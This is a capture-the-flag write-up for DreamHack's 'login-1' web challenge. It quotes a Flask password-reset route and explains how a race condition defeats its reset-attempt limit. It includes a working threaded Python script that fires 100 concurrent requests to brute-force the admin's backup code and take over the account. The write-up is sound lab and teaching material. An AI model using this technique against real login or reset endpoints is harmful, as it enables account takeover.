# login-1 — DreamHack

> **Room / Challenge:** login-1 (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** login-1 (web)
- **Link**: `https://dreamhack.io/wargame/challenges/47`
- **Level:** `2`
- **Date:** `10-11-2025`

---

## Goal

Login as the account with admin rights to get the flag.

## My Solution

The app.py has one route that we have to focus on `/reset-password`:

```python
@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'GET':
        return render_template('forgot.html')
    else:
        userid = request.form.get("userid")
        newpassword = request.form.get("newpassword")
        backupCode = request.form.get("backupCode", type=int)

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            # security for brute force Attack.
            time.sleep(1)

            if user['resetCount'] == MAXRESETCOUNT:
                return "<script>alert('reset Count Exceed.');history.back(-1);</script>"

            if user['backupCode'] == backupCode:
                newbackupCode = makeBackupcode()
                updateSQL = "UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?"
                cur.execute(updateSQL, (hashlib.sha256(newpassword.encode()).hexdigest(), newbackupCode, str(user['idx'])))
                msg = f"<b>Password Change Success.</b><br/>New BackupCode : {newbackupCode}"

            else:
                updateSQL = "UPDATE user set resetCount = resetCount+1 where idx = ?"
                cur.execute(updateSQL, (str(user['idx'])))
                msg = f"Wrong BackupCode !<br/><b>Left Count : </b> {(MAXRESETCOUNT-1)-user['resetCount']}"

            conn.commit()
            return render_template("index.html", msg=msg)

        return "<script>alert('User Not Found.');history.back(-1);</script>";

```

Firstly, this code may appears safely without exploitation can be made however the `time.sleep(1)` is the key where Race Condition come in play. There are 100 possible backup code from 0 -> 100. Therefore, it can be brute-forced. In order to bypass the the max reset count check we can make 100 requests at a time with different backup code. From this we can change the password.

Another route that we can check which user has the admin rights `/user/<int:useridx>`. I visit `/user/14` and saw `orange` has admin rights:

![Guide image](./screenshots/1.png)

Exploit python code:

```python
import requests
import threading

target_url = "http://host1.dreamhack.games:15094/forgot_password"
target_userid = "orange"
new_password = "123"

def send_request(i):
    data = {
        "userid": target_userid,
        "newpassword": new_password,
        "backupCode": i
    }
    try:
        res = requests.post(target_url, data=data, timeout=3)
        if "Password Change Success" in res.text:
            print(f"Changed password with backupCode: {i}")
    except Exception as e:
        print(f"[{i}] Error: {e}")

threads = []

for i in range(100):
    t = threading.Thread(target=send_request, args=(i,))
    threads.append(t)
    t.start()

# wait for all threads to finish
for t in threads:
    t.join()

print("All requests sent.")
```

![Guide image](./screenshots/2.png)

Login with the new password and visit `/admin`

![Guide image](./screenshots/3.png)
